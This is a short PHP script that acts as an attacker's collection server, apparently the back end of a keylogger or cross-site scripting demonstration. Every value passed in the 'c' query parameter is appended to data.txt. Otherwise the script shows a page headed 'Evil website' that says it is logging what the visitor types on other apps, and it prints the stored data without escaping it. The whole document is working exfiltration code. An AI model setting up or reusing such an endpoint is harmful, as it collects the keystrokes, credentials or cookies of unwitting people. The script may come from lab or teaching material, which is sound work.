<?php
if(!empty($_GET['c'])) {
    $logfile = fopen('data.txt', 'a+');
    fwrite($logfile, $_GET['c']."\n");
    fclose($logfile);
}else{
    echo "<h1>Evil website</h1><h3>Is logging what you type on other apps.</h3>";
    echo "<pre>".file_get_contents( "data.txt" )."</pre>";
}
?>
